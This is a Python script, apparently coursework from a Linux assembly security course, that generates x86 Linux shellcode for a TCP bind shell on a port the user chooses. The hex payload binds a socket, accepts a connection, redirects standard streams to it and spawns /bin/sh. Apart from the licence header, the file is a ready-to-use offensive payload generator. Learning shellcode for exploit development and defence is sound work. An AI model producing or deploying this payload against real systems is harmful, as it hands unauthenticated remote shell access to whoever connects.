# Creates a local bind shell on port 6789 that spawns /bin/sh
# This was created as part of the SecurityTube Linux Assembly Expert
# course at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
#
# Travis Mathison
#
# The MIT License (MIT)
#
# Copyright (c) 2018 Travis Mathison
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# !/usr/bin/python

from optparse import OptionParser


def convert_to_hex(port):
    val = hex(options.port)[2::]
    if not len(val) % 2 == 0:
        val = "0" + val
    return ''.join('\\x' + val[i:i + 2] for i in range(0, len(val), 2))


parser = OptionParser()
parser.description = "Generates TCP Bind Shell shellcode."
parser.add_option("-p", "--port", dest="port", help="Port to bind to", type=int)

(options, args) = parser.parse_args()
if not options.port:
    parser.print_help()
    exit(1)

if options.port < 1 or options.port > 65535:
    print("Invalid port number.")
    exit(1)

shellcode = (
        "\\x31\\xc0\\x89\\xc3\\x50\\xb0\\x66\\xb3\\x01\\x53\\x6a\\x02\\x89\\xe1\\xcd"
        "\\x80\\x89\\xc7\\xb0\\x66\\x5b\\x5b\\x43\\x66\\x68" + convert_to_hex(options.port) +
        "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66"
        "\\xb3\\x04\\x6a\\x01\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xfe\\xc3\\x52\\x52"
        "\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\x89\\xc3\\xb0\\x3f\\xcd\\x80\\xb0\\x3f"
        "\\x41\\x83\\xf9\\x02\\x7e\\xf6\\xb0\\x0b\\x31\\xd2\\x52\\x68\\x6e\\x2f\\x73"
        "\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\\xb0\\x06\\x89"
        "\\xfb\\xcd\\x80")

print(shellcode)
